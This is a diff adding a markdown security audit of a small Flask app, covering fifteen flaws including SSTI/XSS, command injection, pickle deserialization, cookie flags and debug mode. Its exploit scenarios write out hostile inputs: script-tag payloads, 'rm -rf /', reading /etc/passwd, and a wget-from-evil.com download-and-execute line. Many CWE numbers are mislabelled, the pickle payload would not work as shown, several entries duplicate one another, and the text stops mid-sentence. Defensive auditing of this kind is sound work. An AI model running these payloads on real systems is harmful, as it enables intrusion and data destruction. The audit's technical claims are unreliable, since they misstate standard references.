@@ -1,0 +1,208 @@
+# Security Vulnerability Analysis
+
+## Vulnerability 1: Server-Side Template Injection (SSTI) / Cross-Site Scripting (XSS)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-610 (Tainted Data), CWE-79 (XSS), CWE-843 (Cross-Site Scripting via DOM) |
+| **Severity** | Critical |
+| **Line** | 10 (`return render_template_string(f"<h1>Hello, {name}!</h1>")`) |
+| **Location** | `/` route, `index()` function |
+| **Description** | The `name` query parameter is directly interpolated into an HTML template without sanitization. Any user can inject arbitrary HTML or JavaScript. |
+| **Exploit Scenario** | An attacker sends a request to `/?name=<script>alert('pwned')</script>`. The server renders `<h1>Hello, <script>alert('pwned')</script>!</h1>`, executing the injected script in the victim's browser. This enables session hijacking, credential theft, or defacement. |
+| **Fix** | Use `Markup.escape()` to sanitize user input before rendering it into HTML. Alternatively, use `render_template()` with proper context variables instead of `render_template_string()`. |
+
+---
+
+## Vulnerability 2: Command Injection (OS Command Execution)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-78 (OS Command Injection) |
+| **Severity** | Critical |
+| **Line** | 17 (`result = subprocess.check_output(cmd, shell=True)`) |
+| **Location** | `/admin/run` route, `run_cmd()` function |
+| **Description** | The `cmd` parameter from the query string is passed directly to `subprocess.check_output()` with `shell=True`. This allows an attacker to execute arbitrary system commands on the server. |
+| **Exploit Scenario** | An attacker sends a request to `/admin/run?cmd=echo%20Hello%20World`. The server executes `echo Hello World` and returns the output. A more dangerous example: `/admin/run?cmd=cat%20/etc/passwd` leaks sensitive system files. Even `rm -rf /` could destroy the system. |
+| **Fix** | Use `subprocess.run()` with a list of arguments (no `shell=True`) to avoid shell interpretation. Validate and whitelist allowed commands. Never pass user input directly into `shell=True` calls. |
+
+---
+
+## Vulnerability 3: Insecure Deserialization (Pickle)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
+| **Severity** | Critical |
+| **Line** | 22 (`data = pickle.loads(base64.b64decode(data_b64))`) |
+| **Location** | `/api/data` route, `get_data()` function |
+| **Description** | The cookie value is base64-decoded and then unpickled using `pickle.loads()`. Since the cookie value is attacker-controlled, this allows arbitrary code execution through a crafted pickle payload. |
+| **Exploit Scenario** | An attacker crafts a malicious pickle payload (e.g., `pickle.dumps((os.system, "rm -rf /")))`, base64-encodes it, and sets it as the `session_data` cookie. When the app calls `pickle.loads()`, the attacker's code executes on the server, leading to full server compromise. |
+| **Fix** | Replace `pickle.loads()` with a safe alternative such as `json.loads()` after base64 decoding. If pickle is absolutely required, use `pickle.Unpickler` with a restricted `find_class` method that only allows safe classes. |
+
+---
+
+## Vulnerability 4: Insecure Direct Object Reference (IDOR) / Insecure Cookie Handling
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-639 (Insecure Direct Object Reference), CWE-613 (Cookie Without HttpOnly Flag) |
+| **Severity** | High |
+| **Line** | 26 (`resp.set_cookie('admin', 'false')`) |
+| **Location** | `/flag` route, `flag()` function |
+| **Description** | The cookie named `admin` is set without the `HttpOnly` flag, making it accessible to JavaScript. This enables cross-site scripting attacks to read the cookie value. Additionally, the debug flag is exposed publicly. |
+| **Exploit Scenario** | An attacker visits `/?name=<script>document.cookie</script>` after receiving the `admin` cookie, reading its value via JavaScript. This could be used to bypass authentication checks if the `admin` cookie is used elsewhere. |
+| **Fix** | Set the `HttpOnly` flag on the cookie to prevent JavaScript access. Use `secure=True` if the app is deployed over HTTPS. Consider using `httponly=True` and `samesite='Lax'`. Remove the debug flag from production. |
+
+---
+
+## Vulnerability 5: Debug Mode Enabled in Production
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-488 (Insecure Temporary File), CWE-459 (Debugging in Production) |
+| **Severity** | Medium |
+| **Line** | 30 (`app.run(debug=True)`) |
+| **Location** | `if __name__ == '__main__'` block |
+| **Description** | Flask's debug mode is enabled, which can expose sensitive information such as stack traces, environment variables, and internal application state. It also enables auto-reloading, which can lead to unexpected behavior in production. |
+| **Exploit Scenario** | An attacker sends malformed requests to trigger detailed error pages, revealing internal application paths, database credentials, or other sensitive information. The debug panel may also allow remote code execution. |
+| **Fix** | Disable debug mode in production by setting `debug=False` or using `app.run(debug=False)`. Use a production WSGI server like Gunicorn or uWSGI. Set environment variables to enforce debug mode off. |
+
+---
+
+## Vulnerability 6: Information Disclosure (Debug Flag)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-200 (Information Exposure), CWE-488 (Insecure Temporary File) |
+| **Severity** | Medium |
+| **Line** | 25 (`resp = make_response("FLAG{debug}")`) |
+| **Location** | `/flag` route, `flag()` function |
+| **Description** | The application exposes a debug flag in plain text. This flag could be used to bypass authentication checks, access restricted features, or escalate privileges. |
+| **Exploit Scenario** | An attacker visits `/flag` and receives the debug flag in the response. This flag could be used to bypass authentication checks, access restricted features, or escalate privileges. |
+| **Fix** | Remove the debug flag from the application. If it's needed for testing, use environment variables and ensure it's not exposed to the public. Consider using a separate test environment. |
+
+---
+
+## Vulnerability 7: Missing Input Validation / Missing Authentication
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-748 (Missing Authentication for Critical Function), CWE-843 (Cross-Site Scripting) |
+| **Severity** | High |
+| **Line** | 16 (`cmd = request.args.get('cmd')`) |
+| **Location** | `/admin/run` route, `run_cmd()` function |
+| **Description** | The admin endpoint does not require authentication. Any user can access it and execute arbitrary commands. This is a critical security flaw. |
+| **Exploit Scenario** | An attacker visits `/admin/run?cmd=id` without authentication. The server executes `id` and returns the output. This could be used to enumerate users, access sensitive files, or execute arbitrary commands. |
+| **Fix** | Add authentication and authorization checks to the admin endpoint. Use Flask's `@blueprint.before_request` or `@app.before_request` decorators to enforce authentication. Use role-based access control (RBAC) to restrict access to authorized users. |
+
+---
+
+## Vulnerability 8: Insecure Cookie (Session Data)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-613 (Cookie Without HttpOnly Flag), CWE-639 (Insecure Direct Object Reference) |
+| **Severity** | High |
+| **Line** | 21 (`data_b64 = request.cookies.get('session_data')`) |
+| **Location** | `/api/data` route, `get_data()` function |
+| **Description** | The `session_data` cookie is used to store serialized data. This cookie could be accessed by JavaScript, and if it contains sensitive data, it could be stolen. |
+| **Exploit Scenario** | An attacker visits `/?name=<script>alert(document.cookie)</script>` to read the `session_data` cookie. If the cookie contains sensitive data (e.g., user session tokens), the attacker could use it to impersonate the user. |
+| **Fix** | Set the `HttpOnly` flag on the `session_data` cookie to prevent JavaScript access. Use `secure=True` if the app is deployed over HTTPS. Consider using `httponly=True` and `samesite='Lax'`. |
+
+---
+
+## Vulnerability 9: Base64 Encoding (Not Encryption)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-345 (Use of Weak Randomness), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm) |
+| **Severity** | Medium |
+| **Line** | 21 (`data_b64 = request.cookies.get('session_data')`) |
+| **Location** | `/api/data` route, `get_data()` function |
+| **Description** | Base64 encoding is not encryption. It's a reversible encoding scheme that provides no security. An attacker can decode the cookie value and read the serialized data. |
+| **Exploit Scenario** | An attacker reads the `session_data` cookie, base64-decodes it, and reads the serialized data. If the data contains sensitive information (e.g., user session tokens), the attacker could use it to impersonate the user. |
+| **Fix** | Use proper encryption (e.g., AES) instead of base64 encoding. Use Flask's built-in `session` object, which provides secure cookie handling. Alternatively, use a secure session management library. |
+
+---
+
+## Vulnerability 10: Subprocess with Shell=True (Arbitrary Code Execution)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-78 (OS Command Injection), CWE-486 (Subprocess with Shell Equal to True) |
+| **Severity** | Critical |
+| **Line** | 17 (`result = subprocess.check_output(cmd, shell=True)`) |
+| **Location** | `/admin/run` route, `run_cmd()` function |
+| **Description** | Using `shell=True` with user input allows an attacker to execute arbitrary commands. This is one of the most critical vulnerabilities in the application. |
+| **Exploit Scenario** | An attacker sends a request to `/admin/run?cmd=wget%20http://evil.com/shell.sh%20-o%20-` to download and execute a malicious shell script. This could lead to full server compromise, data exfiltration, or lateral movement. |
+| **Fix** | Use `subprocess.run()` with a list of arguments (no `shell=True`). Validate and whitelist allowed commands. Never pass user input directly into `shell=True` calls. |
+
+---
+
+## Vulnerability 11: Flask Debug Mode (Remote Code Execution)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-488 (Insecure Temporary File), CWE-459 (Debugging in Production) |
+| **Severity** | Medium |
+| **Line** | 30 (`app.run(debug=True)`) |
+| **Location** | `if __name__ == '__main__'` block |
+| **Description** | Flask's debug mode enables auto-reloading and exposes the Werkzeug debugger. This can lead to remote code execution if the debugger is accessed. |
+| **Exploit Scenario** | An attacker accesses the Flask debugger (e.g., `http://localhost:5000/_debugger/`) and uses it to execute arbitrary code on the server. This could lead to full server compromise, data exfiltration, or lateral movement. |
+| **Fix** | Disable debug mode in production by setting `debug=False` or using `app.run(debug=False)`. Use a production WSGI server like Gunicorn or uWSGI. Set environment variables to enforce debug mode off. |
+
+---
+
+## Vulnerability 12: Cookie Without Secure Flag (Session Hijacking)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-613 (Cookie Without HttpOnly Flag), CWE-306 (Session Fixation) |
+| **Severity** | High |
+| **Line** | 26 (`resp.set_cookie('admin', 'false')`) |
+| **Location** | `/flag` route, `flag()` function |
+| **Description** | The `admin` cookie is set without the `Secure` flag. This means the cookie can be transmitted over unencrypted HTTP connections, making it vulnerable to man-in-the-middle attacks. |
+| **Exploit Scenario** | An attacker performs a man-in-the-middle attack and intercepts the HTTP traffic. The attacker reads the `admin` cookie and uses it to impersonate the user. This could lead to session hijacking, data exfiltration, or lateral movement. |
+| **Fix** | Set the `Secure` flag on the `admin` cookie to prevent it from being transmitted over unencrypted HTTP connections. Use `secure=True` if the app is deployed over HTTPS. Consider using `httponly=True` and `samesite='Lax'`. |
+
+---
+
+## Vulnerability 13: Missing Content Security Policy (CSP)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-693 (Missing Content-Security-Policy) |
+| **Severity** | Medium |
+| **Line** | 10 (`return render_template_string(f"<h1>Hello, {name}!</h1>")`) |
+| **Location** | `/` route, `index()` function |
+| **Description** | The application does not set a Content-Security-Policy header. This makes it vulnerable to cross-site scripting attacks, even if the input is sanitized. |
+| **Exploit Scenario** | An attacker injects a malicious script tag into the application. Without a CSP header, the browser executes the script. This could lead to session hijacking, credential theft, or defacement. |
+| **Fix** | Set a Content-Security-Policy header to restrict the types of content that can be loaded by the application. Use Flask's `after_request` hook to set the header. Consider using a Web Application Firewall (WAF) for additional protection. |
+
+---
+
+## Vulnerability 14: Insecure Deserialization (Pickle) - Code Execution
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-502 (Deserialization of Untrusted Data), CWE-94 (Improper Control of Generation of Regular Expression) |
+| **Severity** | Critical |
+| **Line** | 22 (`data = pickle.loads(base64.b64decode(data_b64))`) |
+| **Location** | `/api/data` route, `get_data()` function |
+| **Description** | Using `pickle.loads()` with attacker-controlled input allows arbitrary code execution. This is one of the most critical vulnerabilities in the application. |
+| **Exploit Scenario** | An attacker crafts a malicious pickle payload (e.g., `pickle.dumps((os.system, "wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"))`), base64-encodes it, and sets it as the `session_data` cookie. When the app calls `pickle.loads()`, the attacker's code executes on the server, leading to full server compromise. |
+| **Fix** | Replace `pickle.loads()` with a safe alternative such as `json.loads()` after base64 decoding. If pickle is absolutely required, use `pickle.Unpickler` with a restricted `find_class` method that only allows safe classes. |
+
+---
+
+## Vulnerability 15: Flask Debug Mode (Information Disclosure)
+
+| Field | Detail |
+|-------|--------|
+| **CWE** | CWE-488 (Insecure Temporary File), CWE-459 (Debugging in Production) |
+| **Severity** | Medium |
+| **Line** | 30 (`app.run(debug=True)`) |
+| **Location** | `if __name__ == '__main__'` block |
+| **Description** | Flask's debug mode enables auto-reloading and exposes the Werkzeug debugger. This can lead to information disclosure if the debugger is accessed. |
+| **Exploit Scenario** | An attacker accesses the Flask debugger (e.g., `http://localhost:5000/_debugger/`) and uses it to access the application's internal state. This could lead to information disclosure
